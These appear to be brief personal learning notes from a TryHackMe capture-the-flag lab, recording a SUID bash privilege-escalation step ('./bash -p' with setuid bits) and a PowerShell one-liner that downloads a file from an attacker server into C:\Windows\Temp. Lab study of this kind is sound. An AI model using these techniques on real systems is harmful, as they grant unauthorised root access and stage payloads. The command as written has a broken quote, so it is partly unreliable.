@@ -1,0 +1,15 @@
+I was working on network services 2 machine of try hackme where I faced explloiting shell using bash executable 
+The first mistake I didn’t read that they have provided a link of bash suid exploit
+
+2 .
+
+I am setting its permission of executable as -rwSr-Sr-x
+But it should be in small all its s like -rwsr -sr -x-
+
+And that’s why when executing shell not working using ./bash -p
+
+
+
+3.
+How to download file thru attacker server on windows  use [ powershell -c "Invoke-WebRequest -Uri 'http://ip:port/filename -OutFile 'C:\Windows\Temp' " ]
+	We used Temp folder because its mostly writable
